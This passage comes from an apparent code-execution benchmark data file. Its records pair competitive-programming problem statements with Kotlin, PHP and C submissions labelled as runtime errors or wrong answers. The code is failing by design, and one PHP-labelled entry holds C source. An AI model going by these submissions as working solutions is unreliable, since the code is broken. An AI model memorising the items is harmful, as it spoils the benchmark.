get(j))\n        set(j, temp)\n    }\n}\n\n@JvmField var _random: Random? = null\nval random get() = _random ?: Random(0x594E215C123 * System.nanoTime()).also { _random = it }\n\nfun IntArray.shuffle(rnd: Random = random) = _shuffle(rnd, ::get, ::set, size)\nfun IntArray.sort() { shuffle(); _sort() }\nfun IntArray.sortDescending() { shuffle(); _sortDescending() }\n\nfun LongArray.shuffle(rnd: Random = random) = _shuffle(rnd, ::get, ::set, size)\nfun LongArray.sort() { shuffle(); _sort() }\nfun LongArray.sortDescending() { shuffle(); _sortDescending() }\n\nfun DoubleArray.shuffle(rnd: Random = random) = _shuffle(rnd, ::get, ::set, size)\nfun DoubleArray.sort() { shuffle(); _sort() }\nfun DoubleArray.sortDescending() { shuffle(); _sortDescending() }\n\nfun CharArray.shuffle(rnd: Random = random) = _shuffle(rnd, ::get, ::set, size)\ninline fun CharArray.sort() { _sort() }\ninline fun CharArray.sortDescending() { _sortDescending() }\n\ninline fun <T: Comparable<T>> Array<out T>.sort() = _sort()\ninline fun <T: Comparable<T>> Array<out T>.sortDescending() = _sortDescending()\ninline fun <T: Comparable<T>> MutableList<out T>.sort() = _sort()\ninline fun <T: Comparable<T>> MutableList<out T>.sortDescending() = _sortDescending()\n\nfun `please stop removing these imports IntelliJ`() {\n    iprintln(max(1, 2))\n}","description":"Friday is Polycarpus' favourite day of the week. Not because it is followed by the weekend, but because the lessons on Friday are 2 IT lessons, 2 math lessons and 2 literature lessons. Of course, Polycarpus has prepared to all of them, unlike his buddy Innocentius. Innocentius spent all evening playing his favourite game Fur2 and didn't have enough time to do the literature task. As Innocentius didn't want to get an F, he decided to do the task and read the book called \"Storm and Calm\" during the IT and Math lessons (he never used to have problems with these subjects). When the IT teacher Mr. Watkins saw this, he decided to give Innocentius another task so that the boy concentrated more on the lesson and less \u2014 on the staff that has nothing to do with IT. Mr. Watkins said that a palindrome is a string that can be read the same way in either direction, from the left to the right and from the right to the left. A concatenation of strings a, b is a string ab that results from consecutive adding of string b to string a. Of course, Innocentius knew it all but the task was much harder than he could have imagined. Mr. Watkins asked change in the \"Storm and Calm\" the minimum number of characters so that the text of the book would also be a concatenation of no more than k palindromes. Innocentius can't complete the task and therefore asks you to help him.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains a non-empty string s which is the text of \"Storm and Calm\" (without spaces). The length of the string s does not exceed 500 characters. String s consists of uppercase and lowercase Latin letters. The second line contains a single number k (1\u2009\u2264\u2009k\u2009\u2264\u2009|s|, where |s| represents the length of the string s).","output_spec":"Print on the first line the minimum number of changes that Innocentius will have to make. Print on the second line the string consisting of no more than k palindromes. Each palindrome should be non-empty and consist of uppercase and lowercase Latin letters. Use the character \"+\" (ASCII-code 43) to separate consecutive palindromes. If there exist several solutions, print any of them. The letters' case does matter, that is an uppercase letter is not considered equivalent to the corresponding lowercase letter.","notes":null,"sample_inputs":["abacaba\n1","abdcaba\n2","abdcaba\n5","abacababababbcbabcd\n3"],"sample_outputs":["0\nabacaba","1\nabdcdba","0\na+b+d+c+aba","1\nabacaba+babab+bcbabcb"]}
{"difficulty":1700,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"cb47d710361979de0f975cc34fc22c7a","submission_id":"re_1461","tags":["dp","binary search","data structures"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.util.*\n\nprivate const val MODULO = 1000000007\n\nfun Long.to(): Int = (this shr 32).toInt() \nfun Long.from(): Int = (this and 0xFFFFL).toInt()\n\nfun bus(from: Int, to: Int): Long =\n        (to.toLong() shl 32) + from\n\nclass TaskD(numSegments: Int, val buses: LongArray) {\n    var count: IntArray\n    var countSum: IntArray\n\n    init {\n        var allStops = IntArray(buses.size * 2 + 2)\n        for (i in 0 until buses.size) {\n            allStops[i * 2] = buses[i].from()\n            allStops[i * 2 + 1] = buses[i].to()\n        }\n        allStops[allStops.size - 2] = 0\n        allStops[allStops.size - 1] = numSegments\n        allStops.sort()\n        var i = 0\n        var j = 1\n        while (j < allStops.size) {\n            if (allStops[i] != allStops[j]) {\n                allStops[++i] = allStops[j++]\n            } else {\n                j++\n            }\n        }\n        allStops = allStops.copyOf(i + 1)\n\n        val stopIndices = sortedMapOf<Int, Int>()\n        for (i in 0 until allStops.size)\n            stopIndices[allStops[i]] = i\n\n        for (i in buses.indices) {\n            val bus = buses[i] \n            buses[i] = bus(stopIndices[bus.from()]!!, stopIndices[bus.to()]!!)\n        }\n\n        buses.sort()\n\n        count = IntArray(stopIndices.size)\n        count[0] = 1\n        countSum = IntArray(count.size, { 1 })\n        countSum[0] = 0\n    }\n\n    fun result() = mod(count.last(), MODULO)\n\n    fun run() {\n        var lastTo = 0\n        var total = 0\n        for (b in buses) {\n            val countDelta = mod(countSum[b.to()] - countSum[b.from()], MODULO)\n            addCount(b.to(), countDelta)\n        }\n\n\/\/        addCount(lastTo, total)\n    }\n\n    fun addCount(i: Int, d: Int) {\n        count[i] = (count[i] + d) % MODULO\n        for (j in i + 1 until countSum.size)\n            countSum[j] = (countSum[j] + d) % MODULO\n    }\n\n    fun print() {\n        println(result())\n    }\n}\n\nfun mod(n: Int, m: Int): Int = (n % m + m) % m\n\nfun cfd() = with(Scanner(System.`in`)) {\n    val numSegments = nextInt();\n    val numbuses = nextInt()\n    val buses = LongArray(numbuses) {\n        val from = nextInt()\n        val to = nextInt()\n        bus(from, to)\n    }\n\n    with(TaskD(numSegments, buses)) {\n        run()\n        print()\n    }\n}\n\nfun main(args: Array<String>) {\n    if (args.size == 0) cfd()\n}","description":"Little boy Gerald studies at school which is quite far from his house. That's why he has to go there by bus every day. The way from home to school is represented by a segment of a straight line; the segment contains exactly n\u2009+\u20091 bus stops. All of them are numbered with integers from 0 to n in the order in which they follow from Gerald's home. The bus stop by Gerald's home has number 0 and the bus stop by the school has number n.There are m buses running between the house and the school: the i-th bus goes from stop si to ti (si\u2009&lt;\u2009ti), visiting all the intermediate stops in the order in which they follow on the segment. Besides, Gerald's no idiot and he wouldn't get off the bus until it is still possible to ride on it closer to the school (obviously, getting off would be completely pointless). In other words, Gerald can get on the i-th bus on any stop numbered from si to ti\u2009-\u20091 inclusive, but he can get off the i-th bus only on the bus stop ti.Gerald can't walk between the bus stops and he also can't move in the direction from the school to the house.Gerald wants to know how many ways he has to get from home to school. Tell him this number. Two ways are considered different if Gerald crosses some segment between the stops on different buses. As the number of ways can be too much, find the remainder of a division of this number by 1000000007 (109\u2009+\u20097).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers: n and m (1\u2009\u2264\u2009n\u2009\u2264\u2009109,\u20090\u2009\u2264\u2009m\u2009\u2264\u2009105). Then follow m lines each containing two integers si,\u2009ti. They are the numbers of starting stops and end stops of the buses (0\u2009\u2264\u2009si\u2009&lt;\u2009ti\u2009\u2264\u2009n).","output_spec":"Print the only number \u2014 the number of ways to get to the school modulo 1000000007 (109\u2009+\u20097).","notes":"NoteThe first test has the only variant to get to school: first on bus number one to the bus stop number one; then on bus number two to the bus stop number two.In the second test no bus goes to the third bus stop, where the school is positioned. Thus, the correct answer is 0.In the third test Gerald can either get or not on any of the first four buses to get closer to the school. Thus, the correct answer is 24\u2009=\u200916.","sample_inputs":["2 2\n0 1\n1 2","3 2\n0 1\n1 2","5 5\n0 1\n0 2\n0 3\n0 4\n0 5"],"sample_outputs":["1","0","16"]}
{"difficulty":2200,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"ce5cc8512359701696dba1b254c6afda","submission_id":"re_1423","tags":["dp","bitmasks","graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.io.*\nimport java.util.*\n\nfun main(args: Array<String>) {\n    val sc = BufferedReader(InputStreamReader(System.`in`))\n    val out = PrintWriter(BufferedOutputStream(System.out))\n    val (n, m) = sc.readLine()!!.split(\" \").map(String::toInt)\n    if (n < 3) {\n        out.println(\"0\")\n    } else {\n        val graph = Graph(n)\n        for (i in 0 until m) {\n            val (u, v) = sc.readLine()!!.split(\" \").map { it.toInt() - 1 }\n            graph.addEdge(u, v)\n        }\n        graph.checkDeep()\n        out.println(graph.count)\n    }\n    out.close()\n}\n\ninternal class Node(val id: Int) {\n    val links = LinkedList<Node>()\n}\n\ninternal class Graph(var n: Int) {\n    var graphArray = Array(n) { Node(it) }\n    private val colors = Array(n) { 0 }\n    var count: Long = 0\n\n    fun addEdge(from: Int, to: Int) {\n        graphArray[from].links.add(graphArray[to])\n        graphArray[to].links.add(graphArray[from])\n    }\n\n    fun checkDeep() {\n        for (i in 0 until n) {\n            if (colors[i] == 0) {\n                colors[i] = 1\n                dfs(graphArray[i])\n            }\n        }\n    }\n\n    private fun dfs(n: Node) {\n        for (it in n.links) {\n            if (colors[it.id] == 0) {\n                colors[it.id] = 1\n                dfs(it)\n            } else if (colors[it.id] == colors[n.id]) {\n                count++\n            }\n        }\n        colors[n.id] = 0\n    }\n}","description":"Given a simple graph, output the number of simple cycles in it. A simple cycle is a cycle with no repeated vertices or edges.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of input contains two integers n and m (1\u2009\u2264\u2009n\u2009\u2264\u200919, 0\u2009\u2264\u2009m) \u2013 respectively the number of vertices and edges of the graph. Each of the subsequent m lines contains two integers a and b, (1\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009n, a\u2009\u2260\u2009b) indicating that vertices a and b are connected by an undirected edge. There is no more than one edge connecting any pair of vertices.","output_spec":"Output the number of cycles in the given graph.","notes":"NoteThe example graph is a clique and contains four cycles of length 3 and three cycles of length 4.","sample_inputs":["4 6\n1 2\n1 3\n1 4\n2 3\n2 4\n3 4"],"sample_outputs":["7"]}
{"difficulty":1600,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"d3a0402de1338a1a542a86ac5b484acc","submission_id":"re_132","tags":["dp","number theory","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"\/**\n * author: Andreeha\n * created: 2020-04-25 16:56\n *\/\n\nimport java.util.*\n\nfun main() {\n    var n = readInt()\n    var a = readInts()\n    var div = MutableList<Int>(size = 0, init = {0})\n\n    var i = 3\n    div.add(1)\n    while (i * i <= n) {\n        if (n % i == 0) {\n            div.add(i)\n            if (n \/ i != i && n \/ i > 2)\n                div.add(n\/i)\n        }\n        i += 1\n    }\n    var can = false\n    for (i in 0 until div.size) {\n        for (j in 0 until div[i]) {\n            var all = 1;\n            for (k in 0 until n \/ div[i]) {\n                all = a[(k * div[i] + j) % n]\n                if (all == 0)\n                    break\n            }\n            if (all == 1) {\n                can = true\n                break\n            }\n        }\n        if (can) break\n    }\n    println(if (can) \"YES\" else \"NO\")\n}\n\nprivate fun readLn() = readLine()!!\nprivate fun readInt() = readLn().toInt()\nprivate fun readLong() = readLn().toLong()\nprivate fun readDouble() = readLn().toDouble()\nprivate fun readStrings() = readLn().split(\" \")\nprivate fun readInts() = readStrings().map { it.toInt() }\nprivate fun readLongs() = readStrings().map { it.toLong() }\nprivate fun readDoubles() = readStrings().map { it.toDouble() }","description":"There are n knights sitting at the Round Table at an equal distance from each other. Each of them is either in a good or in a bad mood.Merlin, the wizard predicted to King Arthur that the next month will turn out to be particularly fortunate if the regular polygon can be found. On all vertices of the polygon knights in a good mood should be located. Otherwise, the next month will bring misfortunes.A convex polygon is regular if all its sides have same length and all his angles are equal. In this problem we consider only regular polygons with at least 3 vertices, i. e. only nondegenerated.On a picture below some examples of such polygons are present. Green points mean knights in a good mood. Red points mean ones in a bad mood.  King Arthur knows the knights' moods. Help him find out if the next month will be fortunate or not.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains number n, which is the number of knights at the round table (3\u2009\u2264\u2009n\u2009\u2264\u2009105). The second line contains space-separated moods of all the n knights in the order of passing them around the table. \"1\" means that the knight is in a good mood an \"0\" means that he is in a bad mood.","output_spec":"Print \"YES\" without the quotes if the following month will turn out to be lucky. Otherwise, print \"NO\".","notes":null,"sample_inputs":["3\n1 1 1","6\n1 0 1 1 1 0","6\n1 0 0 1 0 1"],"sample_outputs":["YES","YES","NO"]}
{"difficulty":1600,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"ed1a2ae733121af6486568e528fe2d84","submission_id":"fba5858b1891057ba82013c56da0d1a5","tags":["sortings","brute force","math"],"exec_outcome":"WRONG_ANSWER","source_code":"import kotlin.math.*\n\nprivate fun readLn() = readLine()!!\nprivate fun readInt() = readLn().toInt()\nprivate fun readStrings() = readLn().split(\" \")\nprivate fun readInts() = readStrings().map { it.toInt() }\n\nfun main(){\n    val (n, k) = readInts()\n    val a = readInts().sorted()\n    println(a)\n    var cnt = IntArray(200005, {0})\n    var ans = IntArray(200005, {0})\n    for (i in 0 until n){\n        var temp = a[i]\n        var d = 0\n        while (temp > 0){\n            if (cnt[temp] < k) {\n                cnt[temp]++;\n                ans[temp] += d\n            }\n            temp \/= 2\n            d++\n        }\n    }\n    var res = Int.MAX_VALUE\n    for (i in 1..a[n - 1]){\n        if (cnt[i] == k) res = min(res, ans[i])\n    }\n    print(res)\n}\n","description":"The only difference between easy and hard versions is the number of elements in the array.You are given an array $$$a$$$ consisting of $$$n$$$ integers. In one move you can choose any $$$a_i$$$ and divide it by $$$2$$$ rounding down (in other words, in one move you can set $$$a_i := \\lfloor\\frac{a_i}{2}\\rfloor$$$).You can perform such an operation any (possibly, zero) number of times with any $$$a_i$$$.Your task is to calculate the minimum possible number of operations required to obtain at least $$$k$$$ equal numbers in the array.Don't forget that it is possible to have $$$a_i = 0$$$ after some operations, thus the answer always exists.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains two integers $$$n$$$ and $$$k$$$ ($$$1 \\le k \\le n \\le 50$$$) \u2014 the number of elements in the array and the number of equal numbers required. The second line of the input contains $$$n$$$ integers $$$a_1, a_2, \\dots, a_n$$$ ($$$1 \\le a_i \\le 2 \\cdot 10^5$$$), where $$$a_i$$$ is the $$$i$$$-th element of $$$a$$$.","output_spec":"Print one integer \u2014 the minimum possible number of operations required to obtain at least $$$k$$$ equal numbers in the array.","notes":null,"sample_inputs":["5 3\n1 2 2 4 5","5 3\n1 2 3 4 5","5 3\n1 2 3 3 3"],"sample_outputs":["1","2","0"]}
{"difficulty":1600,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"fbfc333ad4b0a750f654a00be84aea67","submission_id":"re_1085","tags":["shortest paths","graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.util.*\n\nfun main(args: Array<String>) {\n    val scanner = Scanner(System.`in`)\n    val n = scanner.nextInt()\n    val rr = scanner.nextInt()\n\n    val adj = Array(n, { _ ->\n        BooleanArray(n, { _ ->\n            false\n        })\n    })\n\n    for (i in 1..rr) {\n        val a = scanner.nextInt()\n        val b = scanner.nextInt()\n\n        adj[a - 1][b - 1] = true\n        adj[b - 1][a - 1] = true\n    }\n\n    val rrExists = adj[0][n - 1]\n\n    val distance = IntArray(n, { _ -> Int.MAX_VALUE })\n    val q = LinkedList<Int>()\n    q.push(1)\n    distance[0] = 0\n\n    while (q.isNotEmpty()) {\n        var curr = q.poll()\n\n        adj[curr - 1].indices\n                .filter { distance[it] > distance[curr - 1] + 1 && rrExists != adj[curr - 1][it] }\n                .forEach {\n                    distance[it] = distance[curr - 1] + 1\n                    q.push(it + 1)\n                }\n\n    }\n\n    if (distance[n - 1] == 0) {\n        println(-1)\n    } else {\n        println(distance[n - 1])\n    }\n\n}","description":"In Absurdistan, there are n towns (numbered 1 through n) and m bidirectional railways. There is also an absurdly simple road network\u00a0\u2014 for each pair of different towns x and y, there is a bidirectional road between towns x and y if and only if there is no railway between them. Travelling to a different town using one railway or one road always takes exactly one hour.A train and a bus leave town 1 at the same time. They both have the same destination, town n, and don't make any stops on the way (but they can wait in town n). The train can move only along railways and the bus can move only along roads.You've been asked to plan out routes for the vehicles; each route can use any road\/railway multiple times. One of the most important aspects to consider is safety\u00a0\u2014 in order to avoid accidents at railway crossings, the train and the bus must not arrive at the same town (except town n) simultaneously.Under these constraints, what is the minimum number of hours needed for both vehicles to reach town n (the maximum of arrival times of the bus and the train)? Note, that bus and train are not required to arrive to the town n at the same moment of time, but are allowed to do so.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains two integers n and m (2\u2009\u2264\u2009n\u2009\u2264\u2009400, 0\u2009\u2264\u2009m\u2009\u2264\u2009n(n\u2009-\u20091)\u2009\/\u20092)\u00a0\u2014 the number of towns and the number of railways respectively. Each of the next m lines contains two integers u and v, denoting a railway between towns u and v (1\u2009\u2264\u2009u,\u2009v\u2009\u2264\u2009n, u\u2009\u2260\u2009v). You may assume that there is at most one railway connecting any two towns.","output_spec":"Output one integer\u00a0\u2014 the smallest possible time of the later vehicle's arrival in town n. If it's impossible for at least one of the vehicles to reach town n, output \u2009-\u20091.","notes":"NoteIn the first sample, the train can take the route  and the bus can take the route . Note that they can arrive at town 4 at the same time.In the second sample, Absurdistan is ruled by railwaymen. There are no roads, so there's no way for the bus to reach town 4.","sample_inputs":["4 2\n1 3\n3 4","4 6\n1 2\n1 3\n1 4\n2 3\n2 4\n3 4","5 5\n4 2\n3 5\n4 5\n5 1\n1 2"],"sample_outputs":["2","-1","3"]}
{"difficulty":900,"lang":"PHP","lang_cluster":"php","src_uid":"102667eaa3aee012fef70f4192464674","submission_id":"re_1163","tags":["implementation","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\n$n = trim(fgets(STDIN));\n$a = explode(' ',trim(fgets(STDIN)));\n$m = trim(fgets(STDIN));\n$b = explode(' ',trim(fgets(STDIN)));\n\n$max = 0;\n$r = 0;\nfor($i=0;$i<$n;$i++)\n for($j=0;$j<$m;$j++)\n  if($b[$j] % $a[$i] == 0)\n   if($b[$j]\/$a[$i] == $max) $r++; else {$max = $b[$j]\/$a[$i]; $r = 1;}\n\nprint $r;\n?>","description":"Vasya's bicycle chain drive consists of two parts: n stars are attached to the pedal axle, m stars are attached to the rear wheel axle. The chain helps to rotate the rear wheel by transmitting the pedal rotation.We know that the i-th star on the pedal axle has ai (0\u2009&lt;\u2009a1\u2009&lt;\u2009a2\u2009&lt;\u2009...\u2009&lt;\u2009an) teeth, and the j-th star on the rear wheel axle has bj (0\u2009&lt;\u2009b1\u2009&lt;\u2009b2\u2009&lt;\u2009...\u2009&lt;\u2009bm) teeth. Any pair (i,\u2009j) (1\u2009\u2264\u2009i\u2009\u2264\u2009n;\u00a01\u2009\u2264\u2009j\u2009\u2264\u2009m) is called a gear and sets the indexes of stars to which the chain is currently attached. Gear (i,\u2009j) has a gear ratio, equal to the value .Since Vasya likes integers, he wants to find such gears (i,\u2009j), that their ratios are integers. On the other hand, Vasya likes fast driving, so among all \"integer\" gears (i,\u2009j) he wants to choose a gear with the maximum ratio. Help him to find the number of such gears.In the problem, fraction  denotes division in real numbers, that is, no rounding is performed.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains integer n (1\u2009\u2264\u2009n\u2009\u2264\u200950) \u2014 the number of stars on the bicycle's pedal axle. The second line contains n integers a1,\u2009a2,\u2009...,\u2009an (1\u2009\u2264\u2009ai\u2009\u2264\u2009104) in the order of strict increasing. The third input line contains integer m (1\u2009\u2264\u2009m\u2009\u2264\u200950) \u2014 the number of stars on the rear wheel axle. The fourth line contains m integers b1,\u2009b2,\u2009...,\u2009bm (1\u2009\u2264\u2009bi\u2009\u2264\u2009104) in the order of strict increasing. It is guaranteed that there exists at least one gear (i,\u2009j), that its gear ratio is an integer. The numbers on the lines are separated by spaces.","output_spec":"Print the number of \"integer\" gears with the maximum ratio among all \"integer\" gears.","notes":"NoteIn the first sample the maximum \"integer\" gear ratio equals 3. There are two gears that have such gear ratio. For one of them a1\u2009=\u20094,\u2009b1\u2009=\u200912, and for the other a2\u2009=\u20095,\u2009b3\u2009=\u200915.","sample_inputs":["2\n4 5\n3\n12 13 15","4\n1 2 3 4\n5\n10 11 12 13 14"],"sample_outputs":["2","1"]}
{"difficulty":1200,"lang":"PHP","lang_cluster":"php","src_uid":"143_B","submission_id":"125967919","tags":["implementation","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\r\n\r\n$s = trim(fgets(STDIN));\r\n\r\n$sign = true;\r\nif ($s[0] === '-') {\r\n    $s = substr($s, 1);\r\n    $sign = false;\r\n}\r\n$s .= (strpos($s, '.') === false ? '.00' : '00');\r\n$pos = strpos($s, '.');\r\n$s = '$' . number_format(substr($s, 0, $pos)) . substr($s, $pos, 3);\r\necho($sign ? $s : '(' . $s . ')') . PHP_EOL;\r\n","description":"For some time the program of rounding numbers that had been developed by the Codeforces participants during one of the previous rounds, helped the citizens of Far Far Away to convert numbers into a more easily readable format. However, as time went by, the economy of the Far Far Away developed and the scale of operations grew. So the King ordered to found the Bank of Far Far Away and very soon even the rounding didn't help to quickly determine even the order of the numbers involved in operations. Besides, rounding a number to an integer wasn't very convenient as a bank needed to operate with all numbers with accuracy of up to 0.01, and not up to an integer.The King issued yet another order: to introduce financial format to represent numbers denoting amounts of money. The formal rules of storing a number in the financial format are as follows:   A number contains the integer part and the fractional part. The two parts are separated with a character \".\" (decimal point).  To make digits in the integer part of a number easier to read, they are split into groups of three digits, starting from the least significant ones. The groups are separated with the character \",\" (comma). For example, if the integer part of a number equals 12345678, then it will be stored in the financial format as 12,345,678  In the financial format a number's fractional part should contain exactly two digits. So, if the initial number (the number that is converted into the financial format) contains less than two digits in the fractional part (or contains no digits at all), it is complemented with zeros until its length equals 2. If the fractional part contains more than two digits, the extra digits are simply discarded (they are not rounded: see sample tests).  When a number is stored in the financial format, the minus sign is not written. Instead, if the initial number had the minus sign, the result is written in round brackets.  Please keep in mind that the bank of Far Far Away operates using an exotic foreign currency \u2014 snakes ($), that's why right before the number in the financial format we should put the sign \"$\". If the number should be written in the brackets, then the snake sign should also be inside the brackets. For example, by the above given rules number 2012 will be stored in the financial format as \"$2,012.00\" and number -12345678.9 will be stored as \"($12,345,678.90)\".The merchants of Far Far Away visited you again and expressed much hope that you supply them with the program that can convert arbitrary numbers to the financial format. Can you help them?","input_from":"standard input","output_to":"standard output","input_spec":"The input contains a number that needs to be converted into financial format. The number's notation length does not exceed 100 characters, including (possible) signs \"-\" (minus) and \".\" (decimal point). The number's notation is correct, that is: \n  The number's notation only contains characters from the set {\"0\" \u2013 \"9\", \"-\", \".\"}.  The decimal point (if it is present) is unique and is preceded and followed by a non-zero quantity on decimal digits  A number cannot start with digit 0, except for a case when its whole integer part equals zero (in this case the integer parts is guaranteed to be a single zero: \"0\").  The minus sign (if it is present) is unique and stands in the very beginning of the number's notation  If a number is identically equal to 0 (that is, if it is written as, for example, \"0\" or \"0.000\"), than it is not preceded by the minus sign.  The input data contains no spaces.  The number's notation contains at least one decimal digit. ","output_spec":"Print the number given in the input in the financial format by the rules described in the problem statement.\n","notes":"Pay attention to the second and third sample tests. They show that the sign of a number in the financial format (and consequently, the presence or absence of brackets) is determined solely by the sign of the initial number. It does not depend on the sign of the number you got after translating the number to the financial format.\n","sample_inputs":["2012\n","0.000\n","-0.00987654321\n","-12345678.9\n"],"sample_outputs":["$2,012.00","$0.00","($0.00)","($12,345,678.90)"]}
{"difficulty":1500,"lang":"PHP","lang_cluster":"php","src_uid":"144_C","submission_id":"1260101","tags":["implementation","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"<?\r\n    echo '2';\r\n?>","description":"A string t is called an anagram of the string s, if it is possible to rearrange letters in t so that it is identical to the string s. For example, the string \"aab\" is an anagram of the string \"aba\" and the string \"aaa\" is not.The string t is called a substring of the string s if it can be read starting from some position in the string s. For example, the string \"aba\" has six substrings: \"a\", \"b\", \"a\", \"ab\", \"ba\", \"aba\".You are given a string s, consisting of lowercase Latin letters and characters \"?\". You are also given a string p, consisting of lowercase Latin letters only. Let's assume that a string is good if you can obtain an anagram of the string p from it, replacing the \"?\" characters by Latin letters. Each \"?\" can be replaced by exactly one character of the Latin alphabet. For example, if the string p = \u00ababa\u00bb, then the string \"a??\" is good, and the string \u00ab?bc\u00bb is not. Your task is to find the number of good substrings of the string s (identical substrings must be counted in the answer several times).","input_from":"standard input","output_to":"standard output","input_spec":"The first line is non-empty string s, consisting of no more than 10^5 lowercase Latin letters and characters \"?\". The second line is non-empty string p, consisting of no more than 10^5 lowercase Latin letters. Please note that the length of the string p can exceed the length of the string s.\n","output_spec":"Print the single number representing the number of good substrings of string s.\nTwo substrings are considered different in their positions of occurrence are different. Thus, if some string occurs several times, then it should be counted the same number of times.\n","notes":"Consider the first sample test. Here the string s has two good substrings: \"b??\" (after we replace the question marks we get \"baa\"), \"???\" (after we replace the question marks we get \"baa\").\nLet's consider the second sample test. Here the string s has two good substrings: \"ab?\" (\"?\" can be replaced by \"c\"), \"b?c\" (\"?\" can be replaced by \"a\").\n","sample_inputs":["bb??x???\naab\n","ab?c\nacb\n"],"sample_outputs":["2\n","2\n"]}
{"difficulty":1200,"lang":"PHP","lang_cluster":"php","src_uid":"145_A","submission_id":"3502115","tags":["greedy","implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"#include<string.h>\n#include<stdio.h>\n#define MAXN 100008\nchar sa[MAXN],sb[MAXN];\nint main(){\n     \n     int  i,L,counta,countb,La,count;\n\twhile(scanf(\"%s%s\",sa,sb)!=EOF){\n\t\tL=strlen(sa);\n\t\tLa=0;\n\t\tcounta=0;countb=0;count=0;\n\t\tfor(i=0;i<L;i++)\n\t\t\tif(sa[i]!=sb[i]){\n\t\t\t\tLa++;\n\t\t\t\tif(sa[i]=='7')counta++;\n\t\t\t\tif(sb[i]=='7')countb++;\n\t\t   }\n\t\t\tif(countb>counta){\n\t\t\t\tcount=countb-counta;\n\t\t\t\tLa-=count;\n\t\t\t\tcount+=La\/2;\n\t\t   }\n\t\t\telse if(countb<counta){\n\t\t\t\tcount=counta-countb;\n\t\t\t\tLa-=count;\n\t\t\t\tcount+=La\/2;\n\t\t\t\n\t\t\t}\n\t\t\telse count=La\/2;\n\t\t\t\n\t\t\t\n\t  printf(\"%d\\n\",count);\n\t}\n\treturn 0;\n\n\n\t\n}\n\n \t\t \t\t  \t  \t \t\t \t      \t","description":"Petya loves lucky numbers very much. Everybody knows that lucky numbers are positive integers whose decimal record contains only the lucky digits 4 and 7. For example, numbers 47, 744, 4 are lucky and 5, 17, 467 are not.Petya has two strings a and b of the same length n. The strings consist only of lucky digits. Petya can perform operations of two types:   replace any one digit from string a by its opposite (i.e., replace 4 by 7 and 7 by 4);  swap any pair of digits in string a. Petya is interested in the minimum number of operations that are needed to make string a equal to string b. Help him with the task.","input_from":"standard input","output_to":"standard output","input_spec":"The first and the second line contains strings a and b, correspondingly. Strings a and b have equal lengths and contain only lucky digits. The strings are not empty, their length does not exceed 10^5.\n","output_spec":"Print on the single line the single number \u2014 the minimum number of operations needed to convert string a into string b.\n","notes":"In the first sample it is enough simply to swap the first and the second digit.\nIn the second sample we should replace the second digit with its opposite.\nIn the third number we should replace all three digits with their opposites.\n","sample_inputs":["47\n74\n","774\n744\n","777\n444\n"],"sample_outputs":["1\n","1\n","3\n"]}
{"difficulty":1300,"lang":"PHP","lang_cluster":"php","src_uid":"158_D","submission_id":"12854149","tags":["*special","brute+force","number+theory"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\r\n$a = trim(fgets(STDIN));\r\n$b = explode(\" \", trim(fgets(STDIN)));\r\n$c = array();\r\n$d = array_sum($b);\r\narray_push($c, $d);\r\n$e = $a;\r\n$f = 2;\r\n$g = 0;\r\nwhile(TRUE)\r\n{\r\n    $h = $e \/ 2;\r\n    $i = $e % 2;\r\n    if(($i != 0) || ($h < 3))\r\n    {\r\n        break;\r\n    }\r\n    else\r\n    {\r\n        $e = $h;\r\n        $g++;\r\n    }\r\n}\r\nfor($x = 1; $x <= $g; $x++)\r\n{\r\n    for($y = 0; $y < $f; $y++)\r\n    {\r\n        $j = 0;\r\n        for($z = $y; $z < $a; $z += $f)\r\n        {\r\n            $j += $b[$z];\r\n        }\r\n        array_push($c, $j);\r\n    }\r\n    $f *= 2;\r\n}\r\nprint max($c);\r\n?>","description":"The Berland University is preparing to celebrate the 256-th anniversary of its founding! A specially appointed Vice Rector for the celebration prepares to decorate the campus. In the center of the campus n ice sculptures were erected. The sculptures are arranged in a circle at equal distances from each other, so they form a regular n-gon. They are numbered in clockwise order with numbers from 1 to n.The site of the University has already conducted a voting that estimated each sculpture's characteristic of ti \u2014 the degree of the sculpture's attractiveness. The values of ti can be positive, negative or zero.When the university rector came to evaluate the work, he said that this might be not the perfect arrangement. He suggested to melt some of the sculptures so that:   the remaining sculptures form a regular polygon (the number of vertices should be between 3 and n),  the sum of the ti values of the remaining sculptures is maximized. Help the Vice Rector to analyze the criticism \u2014 find the maximum value of ti sum which can be obtained in this way. It is allowed not to melt any sculptures at all. The sculptures can not be moved.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains an integer n (3\u2264n\u226420000) \u2014 the initial number of sculptures. The second line contains a sequence of integers t1,t2,...,tn, ti \u2014 the degree of the i-th sculpture's attractiveness (-1000\u2264ti\u22641000). The numbers on the line are separated by spaces.\n","output_spec":"Print the required maximum sum of the sculptures' attractiveness.\n","notes":"In the first sample it is best to leave every second sculpture, that is, leave sculptures with attractivenesses: 2, 4, 5 \u0438 3.\n","sample_inputs":["8\n1 2 -3 4 -5 5 2 3\n","6\n1 -2 3 -4 5 -6\n","6\n1 2 3 4 5 6\n"],"sample_outputs":["14\n","9\n","21\n"]}
